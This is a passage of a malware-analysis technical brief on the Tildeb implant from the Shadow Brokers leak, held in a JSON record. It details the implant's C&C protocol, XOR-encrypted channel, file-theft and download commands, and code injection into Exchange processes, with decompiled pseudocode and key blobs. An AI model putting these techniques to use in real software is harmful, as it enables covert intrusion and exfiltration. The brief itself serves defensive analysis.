{
    "id": "c5465ea7-ed5b-4c6e-b85e-8c178dcf3827",
    "created_at": "2022-10-25T16:48:19.621087Z",
    "updated_at": "2025-03-27T02:16:59.336292Z",
    "deleted_at": null,
    "sha1_hash": "e0e24015e1791320e5e81cd74aa57d88d4f5ef08",
    "title": "Tildeb:                                         Analyzing the 18-year-old Implant from the Shadow Brokers’ Leak",
    "authors": "",
    "file_creation_date": "2018-12-11T17:05:43Z",
    "file_modification_date": "2018-12-11T17:05:43Z",
    "file_size": 834285,
    "plain_text": "Tildeb:                     Analyzing the 18-year-old Implant from the Shadow Brokers’ Leak\n\n## Mohamad MokbelTechnical Brief\n\n\n-----\n\n# File and Code Characteristics \n\nThe implant has the following file characteristics:\n\n  - File name: clocksvc.exe\n\n  - Compiled as 32-Bit – Console Windows executable\n\n  - Accepts command-line arguments\n\n  - Compilation timestamp: October 3, 2000 – 21:01:55\n\n  - MD5-hash: 9812a5c5a89b6287c8893d3651b981a0\n\n  - SHA-256: c1bcd04b41c6b574a5c9367b777efc8b95fe6cc4e526978b7e8e09214337fac1\n\n  - File size: 57344 bytes\n\nIt has been 18 years since the implant was compiled, but it’s possible that it may have been created\nearlier considering the time it took to develop and the number of iterations it might have gone through.\nAlthough we cannot say that the compilation timestamp is accurate, it is unlikely to be a forged value\nconsidering the environment it targets and the compiler version used. Moreover, the implant is developed\nusing the C language, with the C++ part restricted to the Windows Foundation Class (MFC) library, that is,\n_mfc42.dll. The MFC library is primarily used for network communications and compiled using Microsoft_\nVisual C++ v6.0.\n\nTildeb’s code is not obfuscated in any way and thus has no anti-disassembly and anti-debugging features,\nencrypted strings, or similar obfuscation techniques.\n\n# Infection Vector and Relation to Other Files\n\nSince Tildeb is positioned as a stand-alone implant, we couldn’t link it to any other files from the leak even\nwhile searching for various artifacts from the implant. However, a search by filename in the rest of the\nleak’s dump shows the table “ProcessInformation” in the database file,\n_\\windows\\Resources\\Ops\\Databases\\SimpleProcesses.db, with the following:_\n\nName Comment Type\nclocksvc.exe *** PATROLWAGON *** SAFE\n\nIt is likely that “PATROLWAGON” is a moniker for an unknown exploitation framework or some other tool\nthat works in conjunction with Tildeb that is yet to be discovered. The DB Table “ProcessInformation”\ncontains a variety of legitimate and known process names and different types. “Type” takes either of the\nfollowing values: NONE, MALICIOUS_SOFTWARE, SECURITY_PRODUCT, CORE_OS, ADMIN_TOOL,\nand SAFE. Of interest is the SAFE type, which shows process names that map to known exploitation\nframeworks and tools such as UNITEDRAKE, MOSSFERN, EXPANDINGPULLY, GROK,\nFOGGYBOTTOM, MORBIDANGEL, and others.\n\nIt is unknown how Tildeb gets delivered onto a targeted system, but it would not be surprising if it’s\ndelivered via lateral movement or through some of the other exploitation frameworks that have RCE\nmodules targeting Windows NT.\n\n1\n\n|Name|Comment|Type|\n|---|---|---|\n|clocksvc.exe|*** PATROLWAGON ***|SAFE|\n\n\n-----\n\n# Command Line Options\n\nTildeb is a console-based executable that can take command-line arguments. Since it doesn’t use MFC’s\n_WinMain function, it instead calls AfxWinInit directly to initialize MFC upon execution. It successfully_\nterminates itself if it fails.\n\nThe implant can take argument 0, 1, 2, 3, or 4 (excluding argv[0]) at once. Each serves a specific\npurpose:\n\n  - Case – 0: If executed without any arguments, it uses the hardcoded IP address\n137[.]140[.]55[.]211 and port 25 to communicate with its C&C server.\n\n  - Case – 1: It expects an IP/domain address to connect to as the C&C server.\n\n  - Case – 2: The first argument is the same as in case – 1. The second argument is the port number\nto connect over.\n\n  - Case – 3: The first two arguments are the same as in case – 2. The third argument is the port it\nuses for creating a Transmission Control Protocol (TCP) socket in listening mode for accepting an\ningress connection in case the egress connection fails (cases: 0, 1, 2). The default listening port\nis hardcoded to 1608.\n\n  - Case – 4: The first three arguments are the same as in case – 3. The fourth argument takes the\nvalue -ju that sets a global variable to 1. This instructs the implant to attempt elevating privileges\nin order to inject code into a Microsoft Exchange Server process.\n\n# Cleanup Thread and Main Process Cleanup Code\n\nAfter checking for any command line arguments, Tildeb will sleep for 4.096 seconds. This is followed by\nsetting a global variable, which we’ve referred to as up_time, with the current time since the Epoch (in\nseconds).\n\nIt then initializes and sets two Security Descriptors discretionary access control lists (DACL) to NULL,\nwhich allows access to two objects. One is a mailslot it creates under the name \\\\.\\mailslot\\c54321. The\nhandle of this object is set as such so it is not inheritable by a new process. Another is a temporary file it\ncreates on the system under the name tmp<uuuu>.tmp. The handle of this object is set as such so it is\ninheritable by a new process.\n\nIt subsequently attempts to initialize Windows Sockets and terminates itself if it fails to do so. Otherwise, it\ncontinues to create a global mutex object under the name nowMutex. The mutex is not created for\nensuring only one instance of itself is running. In fact, there may be more than one instance running at the\nsame time. The mutex is created solely for thread synchronization, that is, for signaling to the cleanup\nthread to acquire it. A mutex is a mutually exclusive object, and only one thread can own it at a time.\n\nTildeb has a fail-aware thread responsible for housecleaning upon failure in specific operations in the\ncode throughout the program lifetime. We’ve referred to this thread as the cleanup_thread.\n\nThe synchronization between the main process thread and the cleanup_thread happens as follows.\nInitially, the main process thread is the owner of the mutex object nowMutex, which is in a non-signaled\nstate at this point. At the same time, the cleanup_thread waits to acquire it indefinitely. For\n_cleanup_thread to acquire the mutex, the owning thread releases it via the ReleaseMutex() application_\nprogramming interface (API). When this happens, the mutex object becomes signaled and the\n_cleanup_thread may acquire it._\n\n2\n\n\n-----\n\nThe release of the mutex object and the trigger of the cleanup process carried out by the cleanup_thread\nhappen when Tildeb:\n\n  - Fails to receive data from the C&C server (if the number of bytes received is 0).\n\n  - Fails to create a process/execute a file (control command 0x20).\n\n  - Successfully acquires the mutex object (if it is signaled by other thread); this is control commanddependent.\n\nWhen the cleanup_thread is created, it first attempts to set the thread’s priority to run only when the\nsystem is idle using the API SetPriorityClass(hThread, IDLE_PRIORITY_CLASS). However, the usage of\nthis API in the context of the thread is not correct, as this pertains to process priority and not threads. The\nproper API would have been SetThreadPriority (hThread, THREAD_PRIORITY_IDLE). Therefore, the\nthread priority level will be that of the process thread priority, which is THREAD_PRIORITY_NORMAL.\nThis mistake is present in every thread created by the implant.\n\nAfter setting the thread's priority, it goes into a while loop where the conditional exit is controlled via a\nglobal flag setting, which we’ve referred to as wayout_flag (initially this flag is set to 0). Inside the loop, it\nsleeps for 15 seconds on every iteration. To exit the while loop:\n\n  - The state of the mutex object must be anything other than signaled.\n\n  - More than 15 minutes had passed since the implant has started (this is also dependent on the\n_up_time value)._\n\nOnce outside the while loop, it checks again if less than 15 minutes have passed. If so, it terminates the\ncleanup thread. Otherwise, it proceeds to close available handles, delete a temp file, shut down and close\nsockets, and terminate the process, as shown in Figure 1.\n\nAccordingly, the cleanup thread functions as a watchdog. If nothing happens that would influence its\nbehavior in less than 15 minutes, the implant cleans after itself and is terminated.\n\nThe main process thread signals the cleanup thread via the pseudocode (shown in Figure 2), which also\nalters the process main thread’s continuous operation. The process thread first attempts to acquire the\nmutex and sets the wayout_flag flag if it is in a non-signaled state. Otherwise, it updates the up_time\nvariable value with the current time, releases the mutex (thus becoming signaled for the cleanup thread to\nacquire it if possible), and then checks if the number of bytes received from the server is 0. If so, it sets\nthe wayout_flag flag. As shown in Figure 2, the main process thread also goes through a similar cleanup\nprocedure when it fails to receive data from the server by setting the wayout_flag flag, causing it to\nterminate itself.\n\nNote that Tildeb is not equipped with any persistence mechanism. It is unlikely that one will be created\nconsidering what the cleanup code does.\n\n3\n\n\n-----\n\n```\n {\n  do {\n   switch (control_cmd) {\n    //...\n   case 0x403:\n    if (WaitForSingleObject(h_nowMutex,10s)) {\n     wayout_flag = 1;\n    }\n    time(&up_time);\n    ReleaseMutex(h_nowMutex);\n    send_data_to_server(data);\n    bytes_read = recv_from_server(&rec_data);\n    if (!bytes_read) {\n     wayout_flag = 1;\n    }\n    if (x_func()) {\n     send_data_to_server(data);\n     break;\n    }\n    //...\n   }\n   while (!wayout_flag)\n   CloseHandle(h_nowMutex);\n   DeleteFileA(&fname);\n   send_data_to_server(&ss, aOk, 3 u, 0);\n   sleep(3s);\n   shutdown(notcreated_socket, 2);\n   CSocket::Close(&ss);\n   time(&up_time);\n   CloseHandle(h_KMSERVER);\n   CloseHandle(h_STORE);\n   CloseHandle(h_DSAMAIN);\n\n```\n\nFigure 1: cleanup_thread pseudocode Figure 2: Main process cleanup and thread\n\nsynchronization pseudocode\n\n# Network Communications\n\nAll of the network sockets created to communicate with the C&C server is carried over the TCP protocol.\nTildeb may establish either an ingress or egress connection with the server depending on which\nconnection is established successfully. It uses the MFC Classes CAsyncSocket and CSocket for all\nnetwork communications.\n\nFirst, it creates a TCP SOCK_STREAM with the list of events “FD_CLOSE | FD_CONNECT |\n_FD_ACCEPT | FD_OOB | FD_WRITE | FD_READ”. However, there's nothing in the code that checks for_\nthese events. Without checking whether the socket is successfully created or not, it attempts to connect\nto it using the hardcoded IP address 137[.]140[.]55[.]211 over the default port number 25. It’s worth noting\nthat despite the port number assignment, the implant does not communicate over the Simple Mail\nTransfer Protocol (SMTP).\n\nIf the connection is successful, it proceeds to set the priority class of the process to\n_NORMAL_PRIORITY_CLASS (no scheduling requirements). It then attempts to disable the Nagle_\n\n4\n\n```\n {\n  do {\n   sleep(15s);\n   if (WaitForSingleObject(h_nowMutex, 10s)) {\n    wayout_flag = 1;\n   }\n   ReleaseMutex(h_nowMutex);\n   elapsed_time = (current_time() - up_time);\n   if (elapsed_time >= 15m) {\n    wayout_flag = 1;\n   }\n  } while (!wayout_flag);\n  if (elapsed_time < 15m) {\n   return 0;\n  }\n  ms_exc.registration.TryLevel = 0;\n  if (h_nowMutex) {\n   CloseHandle(h_nowMutex);\n  }\n  CloseHandle(mailslot_c54321_handle);\n  CloseHandle(mailslot_hfile_v);\n  CloseHandle(h_KMSERVER);\n  CloseHandle(h_STORE);\n  CloseHandle(h_DSAMAIN);\n  shutdown(notcreated_socket, SD_BOTH);\n  CSocket::Close(&CSocket_success);\n  DeleteFileA(&fname);\n  ExitProcess(0xFFFFFFFF);\n\n```\n\nFigure 1: cleanup_thread pseudocode\n\n\n-----\n\nalgorithm for send coalescing using the option TCP_NODELAY for a non-created socket. Additionally,\nthis same, non-existent socket is referenced three more times in the code (all designed to shut it down,\nmaking it likely that it's leftover code). It then sends the check-in message Success\\x00 to the server then\ncreates the cleanup_thread thread.\n\nIf it fails to connect to the socket, it closes it and creates the cleanup_thread thread. It then creates\nanother socket with similar attributes, but for accepting ingress connection over the default port 1608. The\nsocket is created to listen on all network interfaces, expecting to receive the exact check-in message\n_OK*3213* from the server. If the message does not match, the implant bails out._\n\nFigure 3 shows how the abovementioned steps are carried out in the code. Worth noting is the use of\ndifferent classes, CAsyncSocket and CSocket, and the function listen() from the library Ws2_32.dll. It is\nnot clear why these APIs were mixed together to create a socket. Additionally, the return value of the API\n_GetLastError() is never checked for._\n\n```\nlong lEvent = (FD_READ | FD_WRITE | FD_OOB | FD_ACCEPT | FD_CONNECT | FD_CLOSE);\nCAsyncSocket::Create(&CSocket_success, 0, lEvent, 0);\nif (!CAsyncSocket::Connect(&CSocket_success, ip_addr_ar, dst_port_tcp)) {\n GetLastError();        // the return value is never checked!\n CSocket::Close( & CSocket_success);\n if (!CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) {\n  return -1;\n }\n CAsyncSocket::Create(&CSocket_listening, nSocketPort, SOCK_STREAM, lEvent, 0);\n listen(s, 5);         // backlog = max of 5 outstanding connections\n CSocket::Accept(&CSocket_listening, 0, 0);\n Dest[0] = 0;\n CSocket::Receive(&CSocket_listening, Dest, 1024, 0);\n if (strcmp(Dest, aOk3213))              // \"OK*3213*\"\n {\n  return -1;\n }\n}\nh_process = GetCurrentProcess();\nSetPriorityClass(h_process, NORMAL_PRIORITY_CLASS);\nsetsockopt(notcreated_socket, IPPROTO_TCP, TCP_NODELAY, &nd_disable, 4);\nCSocket::Send(&CSocket_success, aSuccess, 8, 0);   // \"Success\\x00\"\nif (!ThreadId && !CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) {\n return -1;\n\n```\n\nFigure 3: Sockets creation - hex-rays decompiler pseudocode\n\nOnce the socket is successfully created and the first plaintext packet is sent or received, Tildeb starts to\nset up a secure communication channel with the server such that all subsequent traffic is encrypted. To\nestablish such a connection, it first expects to receive a buffer of 132 bytes, which we’ve referred to as\n_R_A. Then, it creates a buffer of 132 bytes with pseudorandom data, which we’ve referred to as S_A. The_\nfirst 128 bytes are the result of SHA-1 (modified version) hashing of different elements from the system\nsuch as cursor position, thread ID, thread times, process ID, memory status, system time, and\nperformance counter among others. The 128 bytes are then compared against a hardcoded blob of 132\nbytes. If the last dword value is greater than the last dword value of the hardcoded blob, the buffer is\nregenerated. This comparison is done backward (from last to first) by comparing a dword value from each\nbuffer at a time until the condition fails. We’ll refer to this comparison as cmp_dw_bckwrd. The last 4\nbytes (offsets: [0x88-0x83]) are always zero (this buffer of 132 bytes is first initialized to zero).\n\n5\n\n\n-----\n\nHardcoded blob is:\n13 E3 B7 E3 A0 C9 D9 CE 43 70 A4 54 CE 8D 7E C9 B5 B7 FB 86 E1 12 A9 B4 49 A4 96 97 E4 38 DC\n2E 2D 1E F1 C9 80 C5 8F 2A 36 B3 07 E3 6B 85 DB 2E 5D 7E B8 39 E7 C9 4F DB 04 14 F3 C2 70 D7\n4C 37 C7 54 86 55 F7 8A 31 B8 04 39 7D B5 F0 14 B8 F8 C1 8A 4F 3B A8 89 64 CF 10 82 5C 35 8D 06\n16 81 B5 91 3A 17 E7 BC 1E 5B 44 C9 C6 D5 40 EB 74 D7 D6 2D B1 4F CE 29 00 A7 70 80 45 AB 7E\n8F CF 2D 00 00 00 00\n\nNote that all of the blobs of bytes are stored as strings in the code and in the reverse order of what’s\nshown. Before use, each of them is converted to hex and then the bytes’ order is reversed to look like the\naforementioned blob.\n\nThe S_A buffer is further modified, and similar comparisons are done on it (with the fixed blob 02 00 00\n00 00), and then sent to the server. The R_A buffer is then modified using the 128 pseudorandom bytes\ngenerated earlier for S_A and the blob 02 00 00 00 00.\n\nLater, the implant generates a seed key of 256 bytes (which we’ve referred to as Se_Ke), considering the\nmodified R_A buffer. It then receives a buffer of 132 bytes from the server, which we’ve referred to as\n_R_B. This buffer will then be modified with the hardcoded blob 4B A0 00 00 00 00 00 00 using the_\nhardcoded “random” blob of 132 bytes:\n\n81 A6 B8 DB F3 55 4C B7 90 7A D9 FF 5C 4A ED C4 F8 94 5B EE 0A 32 DE A4 8B C3 40 60 BE 95 C7\n67 43 AB 19 E3 23 DE EA 8E 92 24 4D ED 3C 05 FA C3 9E 4F 86 2F B7 AF 0B AD E6 D7 67 82 44 A7\n7B 10 0C EA AB F5 88 9D E8 45 E3 DC 72 19 F6 75 19 07 50 0E 91 E4 05 CC 1D 11 FC CC 75 64 DA\n10 A2 15 31 3D 1D 85 49 EB D2 74 88 7F 20 90 0E 86 58 7F 75 13 38 35 00 80 D2 20 73 0C 47 8F BD\nAD C9 E2 00 00 00 00\n\nFinally and for verification, it compares both the S_A and R_B buffers. Both have to match to send the\nstatus message Success\\x00 (this is different from the check-in request described earlier). Otherwise, it\nsends the message Error\\x00 to the server. In case the comparison fails, the implant bails out. These\nmessages are sent XOR-encrypted with every key byte being unique. The generated key is dependent on\nthe seed key Se_Ke. Subsequently, all further communications are XOR-encrypted.\n\nIn a nutshell, this exchange of packets demonstrates the sharing of what looks like session keys that are\nclient-server dependent. Each established TCP session with the server would generate a different set of\nencryption and decryption keys. Nevertheless, since only the XOR binary operator is used for encryption\nand decryption, having prior knowledge on the nature of the data being exfiltrated or received makes it\npossible to decrypt it.\n\nFigure 4 shows the code responsible for sending encrypted traffic. Every buffer to be sent is first allocated\non the heap, encrypted, sent, and then freed from memory. From a forensics standpoint, and memory\nanalysis in particular, this makes it hard to collect such evidentiary data. However, this is not the case\nwhen receiving data from the server. It is rather decrypted and consumed without any attempt to clear it\nfrom the memory or disk.\n\n6\n\n\n-----\n\n```\n{\nresult = VirtualAlloc(0,dwSize,MEM_COMMIT,PAGE_READWRITE);\nbuffer = result;\nif (result) {\nqmemcpy(result, data, dwSize);\nfor (i = 0; i < dwSize; ++i) {\nbuffer[i] ^= get_key(Se_Ke);\n}\nbytes_sent = CSocket::Send(hSocket,buffer,dwSize,flag);\nVirtualFree(buffer, 0, MEM_RELEASE);\nresult = bytes_sent;\n}\nreturn result;\n}\n\n```\n\nFigure 4: send function - encrypted channel – hex-rays decompiler pseudocode\n\nAfter setting up a secure communication channel, Tildeb is ready to receive control commands to perform\nvarious malicious activities on the infected system. Figure 5 illustrates the process of establishing a\nsuccessful connection with the remote server.\n\n7\n\n\n-----\n\nFigure 6: How Tildeb establishes a successful connection\n\n\n8\n\n\n-----\n\n# The Hardcoded IP Address 137[.]140[.]55[.]211\n\nThere is an interesting blunder in the way the IP address is hardcoded. It ends with 3-space characters\n(shown highlighted in three different colors) as 137.140.55.211  \\x00, then null terminated. Connecting to\nthe IP address on specific versions of Windows OS works correctly but fails on others. There is a\ntechnical justification for this behavior.\n\nAs noted earlier, the implant uses the MFC library for all network communications. To connect to the IP\naddress, it uses the MFC API CAsyncSocket::Connect() located in the library mfc42.dll. Since MFC\nclasses are just C++ wrappers for Windows APIs, the actual implementation of this function is in the\nWindows ntdll.dll library on, for example, Windows XP(SP3) and other operating systems. The figure\nbelow shows the steps taken to reach the core implementation (for mfc42.dll, File Version: 6.02.8073.0):\n```\n {mfc42.dll} {ws2_32.dll} {ntdll.dll}\n  •CAsyncSocket::Connect() •inet_addr() •RtlIpv4StringToAddressA()\n   CSocket::ConnectHelper()_{mfc42.dll}->CAsyncSocket::ConnectHelper()_{mfc42.dll}->connect()_{WSOCK32.dll}\n\n```\nFigure 6: CAsyncSocket::Connect() API implementation sequence (Windows XP; 32-bit)\n\nFigure 6 shows the functions that get called in an attempt to convert “a string containing an IPv4 address\ndotted-decimal address into a proper address for the in_addr structure”. And as per Microsoft Developer\n[Network’s (MSDN) documentation on the inet_addr() function, passing \" \" (a space) to the inet_addr](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-inet_addr)\nfunction will return zero. In actuality, the inet_addr() function first checks if the first character in the passed\nstring is a space character. If so, it checks if the next character in the string is the null terminated\ncharacter \\x00. If not, it proceeds to call the ntdll function RtlIpv4StringToAddressA(), which is responsible\nfor parsing, sanitizing, and converting the passed string into a proper binary IPv4 address in network\norder.\n\n_RtlIpv4StringToAddressA() checks if every character is in American Standard Code for Information_\nInterchange (ASCII) or a digit. If it is in ASCII, it checks if it is the character \\x2e (.). After a successful\nconversion, the Terminator parameter, which “receives a pointer to the character that terminated the\n_converted string,” returns the space character as the terminating character. The code that follows in the_\nfunction inet_addr() then checks whether it is the null \\x00 terminating character. If not, it checks whether\nit is an ASCII character; if not, it fails. Otherwise, it continues to check if it is a space character. If so, it\nreturns successfully; otherwise, the function fails.\n\nIt is important to note that what contributes to the successful conversion in this case is the fact that the\n_Strict parameter of RtlIpv4StringToAddressA() is set to false. It wouldn’t make sense otherwise in the_\n[context of Tildeb’s operation. MSDN defines](https://docs.microsoft.com/en-us/windows/desktop/api/ip2string/nf-ip2string-rtlipv4stringtoaddressw) the Strict parameter as follows: “A value that indicates\n_whether the string must be an IPv4 address represented in strict four-part dotted-decimal notation. If this_\n_parameter is TRUE, the string must be dotted-decimal with four parts. If this parameter is FALSE, any of_\n_four possible forms are allowed, with decimal, octal, or hexadecimal notation.”_\n\nThis also works with Windows NT 4.0. The function inet_addr() has the actual similar implementation of\n_RtlIpv4StringToAddressA(), but is less sophisticated._\n\n9\n\n|{mfc42.dll}|Col2|\n|---|---|\n|||\n|||\n\n|{ws2_32.dll}|Col2|Col3|\n|---|---|---|\n||||\n||||\n\n|{ntdll.dll}|Col2|Col3|\n|---|---|---|\n||||\n||||\n\n```\n CSocket::ConnectHelper()_{mfc42.dll}->CAsyncSocket::ConnectHelper()_{mfc42.dll}->connect()_{WSOCK32.dll}\n\n```\n\n-----\n\nFor Windows XP, the MFC’s Connect() function works properly. However, this is not the case for\nWindows 7. Figure 7 shows the chain of function calls it takes to actually connect to the IP/domain\naddress (this is for mfc42.dll, File Version: 6.6.8063.0). Not every visited function/API is shown.\n```\n          1  CAsyncSocket::Connect()\n          • {mfc42.dll}\n\n```\n2 `getaddrinfo()`\n```\n          • {ws2_32.dll}\n          3  GetAddrInfoW()\n          • {ws2_32.dll}\n          4  ConvertIp6StringToAddress()\n          • {ws2_32.dll}\n          5  RtlIpv6StringToAddressExW()\n          • {ntdll.dll}\n          6  GetIp4Address() -> RtlIpv4StringToAddressW()\n          • {ws2_32.dll}\n          7  LookupAddressForName()\n          • {ws2_32.dll}\n          • ...\n\n```\nFigure 7: CAsyncSocket::Connect() API implementation sequence (Windows 7 ; 32-bit)\n\nAs shown in Figure 7, the chain of calls is different from that of Windows XP, as the file version of the\nMFC library file is different as well. The getaddrinfo() function is more sophisticated at accounting for\ndifferent scenarios and more. The code within the function GetIp4Address() that’s responsible for\nchecking the Terminator’s parameter value is notable. After successfully calling the function\n_RtlIpv4StringToAddressW(), GetIp4Address() checks the Terminator value if it is the null character \\x00_\nand only this character. If so, the function returns 1 (success). If it is anything other than \\x00, the function\nfails, which is the case in this implant, that is, \\x20. In this case, the setting of the Strict parameter doesn’t\nmatter even if it's set to true.\n\n# Control Commands\n\nThe core of Tildeb’s functionality lies in each of the control commands it supports. After establishing a\nsecure connection with the C&C server, it goes into an infinite loop waiting to receive control commands.\nThe receive function expects a buffer with a maximum length of 4194304 bytes. If no bytes are received\nfrom the server, it sets the flag wayout_flag. This leads to exiting the infinite loop, starting the cleanup\nprocess, and then eventually terminating itself.\n\nTildeb supports a plethora of control commands, all in binary format. All communications are\nencrypted.There are also status messages that Tildeb sends to the server upon attempting to complete a\ngiven task/command. For example, when it receives a control command, or when attempting to get a\nhandle to a file/mailslot, it sends the message .\\x00 (a dot followed by the null terminating character) to\nthe server after it successfully completes any of them. In case it fails, it sends the message Error\\x00.\n\n10\n\n|1|CAsyncSocket::Connect()|\n|---|---|\n\n|2|getaddrinfo()|\n|---|---|\n\n|3|GetAddrInfoW()|\n|---|---|\n\n|4|ConvertIp6StringToAddress()|\n|---|---|\n\n|5|RtlIpv6StringToAddressExW()|\n|---|---|\n\n|6|GetIp4Address() -> RtlIpv4StringToAddressW()|\n|---|---|\n\n|7|LookupAddressForName()|\n|---|---|\n\n\n-----\n\nOther analogous messages are sent to the server as well. The implant uses specific error codes\nrepresented as decimal values that it communicates back to the server upon failing to execute some finegrained operations, and in particular while attempting to inject code into any of the Exchange Server\nprocesses. Furthermore, it sends the message ?\\x00 (a question mark) to the server if it receives an\nunrecognizable control command.\n\nThe following is a detailed description of each of the commands (in no particular order):\n\n  - **0x403:** Deletes a file on the system using the DeleteFileA API.\n\n  - **0x500: Sends the word value 0x2e00 to the server. It expects to receive a buffer of 4 bytes, and if**\nit fails (that is, no bytes were received), it sets the flag wayout_flag to 1. Otherwise, it sends back\nthe same 4 bytes it received from the server. This command functions as a ping-pong check,\nensuring that the connection with the server is healthy.\n\n  - **0x1000: Sets the flag wayout_flag to 1 for implant termination, and then sends the message**\n_Ok\\x00 to the server._\n\n  - **0x401: Uploads a file to the server using C-runtime functions. It works by first getting the filename**\nfrom the server, retrieving the size of the file on the system, and then sending it to the server. It\nthen expects to receive data from the server. If the first byte in the payload is 0x2e, it uploads the\nfile in question to the server (0x200 elements of size, 1 byte at a time), until the end-of-file is\nreached. If it is unable to get a handle to the file, it sends the dword value 0x00000000 (indicating\nthe size) to the server.\n\n  - **0x400: Gets a list of files and folders in a given directory including current date and time,**\nhostname, and files names with their last changed/modified attributes among others. It is saved to\nthe disk in a temporary file, uploaded to the server, and then deleted. The upload function logic is\nthe same as in control command 0x401. However, the difference is that this one uses Windows\nAPIs instead of C-runtime functions. The following is an example of the temporary file’s content:\n```\n         Collected on <hostname>, Sat Nov 24 21:37:16 2018\n         .\n         Listing directory C:\\interpol\\*.*\n         Sat Nov 24 21:35:09 2018  < DIR >   .\n         Sat Nov 24 21:35:09 2018  < DIR >   ..\n         Sun Jan 15 22:40:04 2012     1574 john_galt.pem\n         Sun Jul 22 23:25:58 2012  < DIR >   cia\n         Sat Feb 25 23:43:54 2012     6102 eula.txt\n         Sun Jul 22 23:25:54 2012  < DIR >   fbi\n         Sun Jul 22 23:52:42 2012     3249 us.cfg\n         Tue Jul 17 05:32:14 2012    1002496 ru.exe\n         Sun Jun 12 22:09:18 2011    2206720 cn.dll\n\n```\nIn terms of how the temporary file is created, it first attempts to get the path to the installed MS\nExchangeServer Mailbox from the registry. This is done by querying the Value of the Working\n_Directory registry value name located under the Registry Key: HKLM, SubKey,_\n_System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersSystem. The value of the_\nparameter Working Directory holds the path to MS ExchangeServer Mailbox. If successful, it\ncreates a temporary file in the said directory/path under the name tmp<uuuu>.tmp (<uuuu> is an\nunsigned integer based on the current system time). Otherwise, it creates the file in the current\n\n11\n\n\n-----\n\nuser’s temporary folder under the same name. The created file is meant for writing, with\ntemporary storage and sequential scan.\n\n- **0x380: Sets MS Exchange “Background Cleanup” Registry Value with a value received from the**\nserver, then sends out the old value. The said value is located under the Registry Key HKLM,\nSubKey: System\\CurrentControlSet\\Services\\MSExchangeIS\\ParametersPrivate. The\nbackground cleanup process is responsible for recovering empty space used by attachments,\ndeleted folders, and messages. The Registry ValueName Background Cleanup value (in\n[milliseconds) controls at which rate this process’ task runs.](https://blogs.technet.microsoft.com/komessaging/2009/10/05/soft-deletion-and-hard-deletion/)\n\n- **0x20: The primary function of this control command follows several steps:**\n\n1. It attempts to create a temporary file just as in control command 0x400.\n2. It checks if a conditional flag is set to true, which it initially is. Then, it concatenates the\n\npath it retrieved in the first step with the server response value. For example, the path\nmight look like %temp%\\<server_response>.\n\n2.1 It copies the final path derived in the second step into a global variable,\n\nwhich we’ve referred to as fname_s. This variable will be passed into the\ncode injection function.\n2.2 The conditional flag is set to 0. Thus, this flag is meant to be set only\n\nonce during the implant’s runtime life.\n2.3 If the conditional flag is not set, it would only concatenate the path it\n\nretrieved in the first step with the server response value.\n3. It downloads data from the server and saves it into the file (as binary) created in the first\n\nstep. The downloaded file is expected to be a cabinet-compressed (.cab) file.\n4. It creates a process of the Windows expand utility for decompressing the file downloaded\n\nin the second step under a file name received from the server in the same directory of the\ncreated temporary file.\n5. If process creation (step 4) is successful, it deletes the temporary file from the system.\n\nOtherwise, it sets the wayout_flag flag to 1 and deletes the temporary file.\n\nThe rest of the control commands deals mainly with interprocess communications (IPC) using\nWindows’ mailslots mechanism as well as code injection into specific MS Exchange Server\nprocesses. As detailed below, the implant establishes two-way communication using two\nmailslots. The mailslot it creates or the one it reads from are not referenced in any of the other\ntools and utilities in the leak. Therefore, it is unknown what the other process is supposed to do,\nor how it is supposed to run as a process or as a standalone or child process. The following are\nthe two mailslots referenced in the implant:\n\n**Mailslot name** **Description**\n```\n          \\\\.\\mailslot\\c12345 Tildeb is the client process. \n                       Created by another process. \n                       Tildeb writes to it.\n          \\\\.\\mailslot\\c54321 Tildeb is the server process.\n                       Created by Tildeb.\n                       It reads from it.\n\n```\nMailslots communications are carried over using specific format messages, unique per control\ncommand. However, the general layout has the following structure:\n\n**Format Message** **Populated**\n```\n       '%ld %x',0Ah '6553 0x400000',0Ah\n       '%ld %ls ',0 '<control command> <server_response_x> <# type of info.> <…>'\n\n```\n12\n\n|Mailslot name|Description|\n|---|---|\n|\\\\.\\mailslot\\c12345|Tildeb is the client process. Created by another process. Tildeb writes to it.|\n|\\\\.\\mailslot\\c54321|Tildeb is the server process. Created by Tildeb. It reads from it.|\n\n|Format Message|Populated|\n|---|---|\n|'%ld %x',0Ah '%ld %ls ',0|'6553 0x400000',0Ah '<control command> <server_response_x> <# type of info.> <…>'|\n\n\n-----\n\nThe values 6553 and 0x400000 are hardcoded in the binary. The <control command> value is\neither hardcoded as per referenced control command or populated dynamically.\n_<server_response_x> is data received from the C&C server. There could be multiple receive_\nrequests from the server, which will be concatenated with the previous one.\n\nThe second line of the format message is unique to each command. Judging by the mailslot\nname form, the other processes that use those two mailslots has to reside on the same host of\nTildeb’s process.\n\n- **0x300:**\n\n1. The format message has the following structure:\n\n**Format** **Populated**\n**Message**\n```\n       '%ld %ls ',0 '768 <server_response_a> <server_response_b>'\n\n```\nBoth values under <server_response_a> and <server_response_b> are received in two\nseparate responses from the server. Based on the structure of the code, the value of\n_<server_response_b> could be any of the following: pub.edb, priv.edb, or dir.edb._\n\n2. For one-way interprocess communications (IPC), it creates a thread responsible for\n\ncontinuously attempting to write the formatted message to an already created mailslot\n(under the name \\\\.\\mailslot\\c12345) until successfully done so. The said mailslot is never\ncreated by Tildeb’s itself. It is unknown what the other process is that might be on the\nsystem or on the infected network that created this mailslot.\n3. It creates a mailslot under the name \\\\.\\mailslot\\c54321 (the numbers 54321 are in\n\nreverse order of the mailslot referenced in the first step), for a maximum size of 4194304\nbytes and a time-out value of 30 seconds.\n4. Based on the last server response, it decides which process of MS Exchange Server to\n\ninject code into:\n\n**Server Response** **Process Name**\n```\n           priv.edb STORE.EXE\n           pub.edb STORE.EXE\n           dir.edb DSAMAIN.EXE\n           kmsmdb.edb KMSERVER.EXE\n           <if no match> STORE.EXE\n\n```\nBased on the server response, it injects code into the respective process. If the server\nresponded with the string dir.edb and after successful code injection, it executes the code\nin the fifth step.\n\n5. It receives data from the server and reads from the mailslot \\\\.\\mailslot\\c54321 into a\n\nbuffer of 1024 bytes. If the first byte from the server response is \\x2e, it attempts to\nupload the buffer’s content to the server using the same, exact upload function\nreferenced in the control command 0x400. However, the upload function will fail since it\nexpects a handle to the file to be uploaded. However, Tildeb passes the address of the\nbuffer instead.\n6. It closes the handle of the mailslot 